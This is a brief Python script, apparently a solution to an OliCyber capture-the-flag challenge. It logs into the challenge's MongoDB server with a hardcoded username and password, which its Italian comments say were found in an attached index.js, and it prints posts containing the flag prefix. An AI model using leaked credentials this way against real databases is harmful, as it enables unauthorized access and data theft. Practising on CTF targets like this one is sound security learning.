# So, I just uploaded my first post, and I’d like you to test the security of my website. Can you find anything?
# Website: http://post.challs.olicyber.it/

from pymongo import *

# un file .zip allegato
# le credenziali sono in index.js

m = MongoClient("mongodb://th3pwn3r:W2Zyr&Np@post.challs.olicyber.it/test")
for i in m["test"].get_collection("posts").find(): # prendo coll posts
    if "ptm" in i["content"]:
        print(i["content"], end="")

        # credo sia down.